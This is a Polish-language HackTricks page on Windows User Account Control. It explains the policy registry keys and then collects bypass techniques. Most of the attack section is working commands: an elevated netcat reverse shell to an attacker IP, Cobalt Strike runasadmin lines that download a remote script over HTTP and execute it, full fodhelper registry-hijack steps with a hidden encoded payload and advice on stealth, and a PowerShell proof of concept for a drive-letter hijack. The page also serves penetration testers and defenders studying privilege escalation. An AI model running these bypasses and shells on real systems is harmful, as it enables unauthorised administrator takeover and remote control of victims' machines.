# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która włącza **monit o zgodę dla działań wymagających podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program o **wysokim poziomie** może wykonywać zadania, które **mogą potencjalnie zagrozić systemowi**. Gdy UAC jest włączony, aplikacje i zadania zawsze **uruchamiane są w kontekście konta niebędącego administratorem**, chyba że administrator wyraźnie autoryzuje tym aplikacjom/zadaniom dostęp na poziomie administratora. To udogodnienie chroni administratorów przed niezamierzonymi zmianami, ale nie jest uważane za granicę bezpieczeństwa.

Więcej informacji o poziomach `integrity`:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywny, użytkownik-administrator otrzymuje 2 tokeny: standardowy token użytkownika do wykonywania zwykłych czynności na zwykłym poziomie oraz token z uprawnieniami administratora.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia działanie UAC bardzo szczegółowo i obejmuje proces logowania, doświadczenie użytkownika oraz architekturę UAC. Administratorzy mogą używać polityk zabezpieczeń do skonfigurowania działania UAC specyficznie dla ich organizacji na poziomie lokalnym (używając secpol.msc), albo konfigurować i wdrażać je za pomocą Group Policy Objects (GPO) w środowisku domeny Active Directory. Różne ustawienia omówione są szczegółowo [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Istnieje 10 ustawień Group Policy, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe informacje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru             | Ustawienie domyślne                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Wyłączone                                                    |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Wyłączone                                                    |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Wymagaj zgody dla binarek spoza Windows                      |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Wymagaj podania poświadczeń na bezpiecznym pulpicie          |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Włączone (domyślnie dla Home) Wyłączone (domyślnie dla Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Wyłączone                                                    |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Włączone                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Włączone                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Włączone                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Włączone                                                     |

### UAC Bypass Theory

Niektóre programy są **autoelevated** automatycznie, jeśli **użytkownik należy** do **grupy administratorów**. Te binarki mają w swoich _**Manifests**_ opcję _**autoElevate**_ ustawioną na _**True**_. Dodatkowo binarka musi być podpisana przez Microsoft.

Wiele procesów auto-elevate udostępnia **funkcjonalność przez obiekty COM lub serwery RPC**, które mogą być wywoływane z procesów działających z integracją medium (zwykłe uprawnienia użytkownika). Zauważ, że COM (Component Object Model) i RPC (Remote Procedure Call) to metody używane przez programy Windows do komunikacji i wykonywania funkcji między procesami. Na przykład **`IFileOperation COM object`** jest zaprojektowany do obsługi operacji na plikach (kopiowanie, usuwanie, przenoszenie) i może automatycznie podnosić uprawnienia bez wyświetlania monitu.

Niektóre kontrole mogą sprawdzać, czy proces został uruchomiony z katalogu **System32**, co można obejść np. poprzez **wstrzyknięcie do explorer.exe** lub innego wykonywalnego pliku zlokalizowanego w System32.

Innym sposobem obejścia tych kontroli jest **modyfikacja PEB**. Każdy proces w Windows posiada Process Environment Block (PEB), który zawiera ważne dane o procesie, takie jak ścieżka wykonywalna. Poprzez modyfikację PEB, atakujący mogą sfałszować (spoof) lokalizację własnego złośliwego procesu, sprawiając, że będzie wyglądać, jakby był uruchomiony z zaufanego katalogu (np. System32). Ta sfałszowana informacja oszukuje obiekt COM, aby auto-elevował uprawnienia bez monitu.

Następnie, aby **obejść** **UAC** (podnieść poziom z **medium** `integrity` do **high**), niektórzy atakujący wykorzystują tego typu binarki do **wykonania dowolnego kodu**, ponieważ zostanie on wykonany w procesie o **wysokim poziomie integralności**.

Możesz **sprawdzić** _**Manifest**_ binarki przy użyciu narzędzia _**sigcheck.exe**_ z Sysinternals (`sigcheck.exe -m <file>`). I możesz **zobaczyć** poziom `integrity` procesów używając _Process Explorer_ lub _Process Monitor_ (ze Sysinternals).

### Sprawdzenie UAC

Aby potwierdzić, czy UAC jest włączony, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli to **`1`**, to UAC jest **włączony**, jeśli to **`0`** lub nie istnieje, to UAC jest **wyłączony**.

Następnie sprawdź, **który poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Jeśli **`0`** to UAC nie będzie wyświetlać monitów (jak **wyłączone**)
- Jeśli **`1`** administrator jest **prosny o nazwę użytkownika i hasło** aby uruchomić binarkę z wysokimi uprawnieniami (on Secure Desktop)
- Jeśli **`2`** (**Zawsze powiadamiaj mnie**) UAC zawsze poprosi administratora o potwierdzenie, gdy spróbuje uruchomić coś z wysokimi uprawnieniami (on Secure Desktop)
- Jeśli **`3`** jak `1` ale niekoniecznie na Secure Desktop
- Jeśli **`4`** jak `2` ale niekoniecznie na Secure Desktop
- jeśli **`5`**(**domyślnie**) poprosi administratora o potwierdzenie uruchomienia binarek niebędących częścią Windows z wysokimi uprawnieniami

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Możesz też sprawdzić grupy swojego użytkownika i uzyskać poziom integralności:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Zauważ, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty — możesz po prostu kliknąć "Yes", gdy pojawi się monit UAC

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** Basic UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem należącym do Administrators group możesz **mount the C$** (udział SMB) lokalnie jako nowy dysk i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet do katalogu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike będą działać tylko, jeśli UAC nie jest ustawiony na maksymalny poziom zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **bypass** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) które jest **kompilacją** kilku UAC bypass exploits. Zauważ, że będziesz musiał **skompilować UACME przy użyciu visual studio lub msbuild**. Proces kompilacji stworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć **którego potrzebujesz.**\
Powinieneś **być ostrożny**, ponieważ niektóre bypasses wywołają **monity w innych programach**, które **powiadomią** **użytkownika**, że coś się dzieje.

UACME zawiera **wersję build, od której każda technika zaczęła działać**. Możesz wyszukać technikę dotyczącą twoich wersji:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, używając [this](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, otrzymasz wydanie Windows `1607` z numerów build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany binarny plik `fodhelper.exe` jest auto-elevated w nowoczesnych Windows. Po uruchomieniu odpyta poniższą ścieżkę rejestru per-user bez walidacji `DelegateExecute` verb. Umieszczenie tam polecenia pozwala procesowi o Medium Integrity (użytkownik jest w Administrators) uruchomić proces o High Integrity bez monitu UAC.

Ścieżka rejestru odpytywana przez fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Kroki PowerShell (ustaw swój payload, a następnie trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Uwagi:
- Działa gdy bieżący użytkownik jest członkiem Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu na 64-bitowym Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżką do EXE). Unikaj wywoływania interfejsów wymagających potwierdzenia — zachowaj stealth.

#### More UAC bypass

**Wszystkie** techniki użyte tutaj do obejścia UAC **wymagają** **pełnej interaktywnej powłoki** po stronie ofiary (zwykła powłoka nc.exe nie wystarczy).

Możesz to uzyskać używając sesji **meterpreter**. Zmigruj do **processu**, którego wartość **Session** równa się **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass with GUI

Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC** gdy się pojawi — tak naprawdę nie potrzebujesz wtedy obejścia. Zatem uzyskanie dostępu do GUI pozwoli ominąć UAC.

Co więcej, jeśli uzyskasz sesję GUI, której ktoś używał (np. przez RDP), istnieją **narzędzia uruchomione jako administrator**, z których możesz na przykład **uruchomić** **cmd** **jako admin** bez ponownego monitowania przez UAC, np. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być nieco bardziej **stealthy**.

### Noisy brute-force UAC bypass

Jeśli nie zależy Ci na byciu głośnym, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), które będzie **prosić o podniesienie uprawnień aż użytkownik zaakceptuje**.

### Your own bypass - Basic UAC bypass methodology

Jeśli spojrzysz na **UACME**, zauważysz, że **większość obejść UAC wykorzystuje podatność Dll Hijacking** (głównie zapisując złośliwy dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź binarkę, która **autoelevuje** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź "**NAME NOT FOUND**" zdarzenia, które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** DLL w niektórych **chronionych ścieżkach** (np. C:\Windows\System32), gdzie nie masz uprawnień do zapisu. Możesz to obejść używając:
1. **wusa.exe**: Windows 7, 8 i 8.1. Pozwala wyodrębnić zawartość pliku CAB do chronionych ścieżek (ponieważ narzędzie jest uruchamiane z wysokimi uprawnieniami).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt** kopiujący DLL do chronionej ścieżki i uruchom podatną, autoelevowaną binarkę.

### Another UAC bypass technique

Polega na obserwowaniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **binarki** lub **polecenia** do **wykonania** (to jest bardziej interesujące, jeśli binarka szuka tej informacji w **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” używa shadow-admin tokenów z mapami per-session `\Sessions\0\DosDevices/<LUID>`. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązaniu `\??`. Jeśli atakujący podszyje się pod shadow-admin token tylko na etapie **SecurityIdentification**, katalog zostanie utworzony z atakującym jako **owner** (dziedziczy `CREATOR OWNER`), co pozwala na linki liter dysków, które mają priorytet nad `\GLOBAL??`.

**Steps:**

1. Z niskoprawnej sesji wywołaj `RAiProcessRunOnce`, aby uruchomić bezmonitowy shadow-admin `runonce.exe`.
2. Zduplikuj jego primary token do tokenu **identification** i podszywaj się pod niego podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` pod własnością atakującego.
3. Utwórz tam symlink `C:` wskazujący na kontrolowane przez atakującego miejsce przechowywania; kolejne operacje na systemie plików w tej sesji rozwiążą `C:` do ścieżki atakującego, umożliwiając DLL/file hijack bez monitu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencje
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
